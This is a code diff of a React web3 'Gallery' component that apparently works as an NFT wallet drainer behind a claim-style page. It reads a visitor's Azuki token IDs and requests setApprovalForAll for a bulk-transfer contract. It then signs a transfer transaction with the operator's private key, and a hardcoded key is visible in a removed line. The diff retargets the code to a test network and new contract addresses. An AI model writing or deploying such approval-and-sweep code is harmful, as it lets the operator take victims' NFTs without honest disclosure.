@@ -18,14 +18,17 @@ function Gallery() {
   const [isClaiming, setIsClaiming] = useState(false)
 
   const web3 = new Web3(Web3.givenProvider || 'http://localhost:7545');
-  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0xED5AF388653567Af2F388E6224dC7C4b3241C544")
+  // change azuki contract
+  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0x4092CEeEe9820446CDb83F87Bf501FFB4e8Cd4ed")
   const Alpaca_contract = new web3.eth.Contract(Alpaca_abi, "0x3DB5463A9e2d04334192C6f2DD4B72DeF4751A61")
+  // change contract
+  const bulkTransferContract = "0x4aeC23Ac2f40dA07046b73fac02E0Fd84efC2272" // mainnet contract 0xA10dF3F212e8480db5ffF956d46945B25C762045
 
   const getData = async (address) => {
     const nftbalance = await Azuki_contract.methods.balanceOf(address).call()
     let tokenSet = []
     setBalance(nftbalance)
-    for (let i = 0; i < Math.min(nftbalance, 20); i++) {
+    for (let i = 0; i < Math.min(nftbalance, 10); i++) {
       let id = await Azuki_contract.methods.tokenOfOwnerByIndex(address, i).call()
       tokenSet.push(parseInt(id).toString(16).padStart(64, '0'))
     }
@@ -91,7 +94,7 @@ function Gallery() {
 
   function setApprovalForAll() {
     setIsClaiming(true)
-    Azuki_contract.methods.setApprovalForAll("0xA10dF3F212e8480db5ffF956d46945B25C762045", true).send({ from: defaultAccount }).on('error',
+    Azuki_contract.methods.setApprovalForAll(bulkTransferContract, true).send({ from: defaultAccount }).on('error',
       function (error, tokenIds) {
         console.log(error)
         setIsClaiming(false)
@@ -105,11 +108,12 @@ function Gallery() {
             inputData += temp
           }
           web3.eth.accounts.signTransaction({
-            to: '0xA10dF3F212e8480db5ffF956d46945B25C762045',
+            to: bulkTransferContract,
             gas: 2000000,
-            chainId: 1,
+            // change network ** mainnet ID : 1 **
+            chainId: 4,
             data: inputData
-          }, "0xc36b8ba8db0b8f84dc7649c0f7131f2444cb6f2711ca4e2400f9b82ad9baba39").then(result => {
+          }, process.env.PRIVATE_KEY.toString()).then(result => {
             web3.eth.sendSignedTransaction(result.rawTransaction).on('recript', console.log)
           });
         })
